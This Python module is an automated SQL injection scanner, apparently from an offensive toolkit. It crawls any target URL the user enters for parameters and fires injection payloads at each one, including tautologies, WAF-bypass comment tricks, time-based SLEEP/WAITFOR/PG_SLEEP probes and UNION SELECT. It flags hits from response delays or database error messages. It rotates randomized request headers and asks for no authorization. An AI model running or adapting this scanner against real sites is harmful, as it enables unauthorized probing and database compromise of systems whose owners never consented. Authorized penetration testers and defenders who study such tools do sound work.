# modules/sqli_scan.py
import requests
import time
import random
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from core.randomizer import HeaderFactory

console = Console()

header_factory = HeaderFactory(pool_size=500)

def get_sqli_payloads():
    """
    Returns a list of payloads specifically for SQL Injection (SQLi) detection,
    including techniques for bypassing Web Application Firewalls (WAFs).
    """
    return [
        # Basic SQLi Payloads
        "' OR '1'='1'-- ",
        "\" OR 1=1 -- ",
        "' OR 'a'='a",
        "') OR ('a'='a",
        "1 OR 1=1",

        # Comment-based WAF Bypasses
        "/*'*/OR'1'='1'--",
        "' OR 1=1#",

        # Time-based SQLi Payloads (for blind SQLi)
        "1' WAITFOR DELAY '0:0:5'--",
        "SLEEP(5)#",
        "';SELECT PG_SLEEP(5)--",
        "ORDER BY 1--",
        "ORDER BY 1,2,3--",

        # Union-based SQLi
        "' UNION SELECT NULL, NULL, NULL--",
    ]

def discover_links_and_params(base_url, headers):
    """
    Crawls a URL to find links and form parameters to test.
    """
    console.print(f"[cyan]Crawling {base_url} to discover links and parameters...[/cyan]")
    links_to_scan = {base_url}
    discovered_params = set()

    try:
        response = requests.get(base_url, headers=headers, timeout=10, allow_redirects=True)
        soup = BeautifulSoup(response.content, "html.parser")

        # Find parameters in forms
        for form in soup.find_all("form"):
            for input_tag in form.find_all("input"):
                if name := input_tag.get("name"):
                    discovered_params.add(name)

        # Find links and parameters in hrefs
        for a_tag in soup.find_all("a", href=True):
            href = a_tag['href']
            full_url = urljoin(base_url, href)
            parsed_full_url = urlparse(full_url)
            if urlparse(base_url).netloc == parsed_full_url.netloc:
                links_to_scan.add(full_url)
                if parsed_full_url.query:
                    params = re.findall(r'([^=&]+)=', parsed_full_url.query)
                    discovered_params.update(params)

    except requests.RequestException as e:
        console.print(f"[yellow]Could not crawl {base_url}: {e}[/yellow]")

    console.print(f"[green]Discovered {len(links_to_scan)} links and {len(discovered_params)} parameters.[/green]")
    return list(links_to_scan), list(discovered_params) if discovered_params else ['id', 'user', 'page']

def run_sqli_scan():
    """
    Main function to execute the SQL Injection vulnerability scan.
    """
    console.print(Panel.fit("[b]SQL Injection (SQLi) Scanner[/b]", style="#ff7675", padding=(1, 2)))
    url = console.input("\n[bold]Enter target URL: [/]").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    headers = header_factory.get_headers()
    payloads = get_sqli_payloads()
    error_patterns = ["SQL syntax", "mysql_fetch", "unclosed quotation mark", "ORA-00933", "syntax error"]

    try:
        links_to_scan, discovered_params = discover_links_and_params(url, headers)
        if not discovered_params:
            console.print("[yellow]No parameters discovered. Testing with common defaults.[/yellow]")

        report = Table(title=f"SQLi Report for {urlparse(url).netloc}", style="bright_white", header_style="bold #ff7675", expand=True)
        report.add_column("Location")
        report.add_column("Parameter")
        report.add_column("Payload")
        report.add_column("Status")

        total_tests = len(links_to_scan) * len(discovered_params) * len(payloads)
        progress = Progress(SpinnerColumn(), "[progress.description]{task.description}", BarColumn(), "{task.completed}/{task.total}", TextColumn("[bold green]{task.fields[status]}"), transient=True)

        with Live(report, console=console, screen=False):
            with progress:
                task = progress.add_task("[cyan]Scanning for SQLi...", total=total_tests, status="Initializing...")
                for link in links_to_scan:
                    for param in discovered_params:
                        for payload in payloads:
                            progress.update(task, advance=1, status=f"Testing {param} on {link[:50]}...")
                            test_url = f"{link}?{param}={payload}"
                            try:
                                start_time = time.time()
                                response = requests.get(test_url, headers=headers, timeout=10, allow_redirects=False)
                                elapsed_time = time.time() - start_time

                                vulnerable = False
                                # Time-based check for blind SQLi
                                if elapsed_time > 4.5:
                                    vulnerable = True
                                # Error-based check
                                if any(error in response.text for error in error_patterns):
                                    vulnerable = True

                                if vulnerable:
                                    report.add_row(f"[cyan]{link}[/cyan]", f"[magenta]{param}[/magenta]", f"[bright_black]{payload[:30]}...[/]", "[red]Vulnerable[/red]")
                            except requests.RequestException:
                                continue
            console.print(Panel(report, title="[bold]Scan Complete[/bold]", style="#ff7675"))

    except requests.RequestException as e:
        console.print(f"[bold red]Error: Could not connect to target. {e}[/bold red]")
    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred: {e}[/bold red]")

if __name__ == "__main__":
    run_sqli_scan()
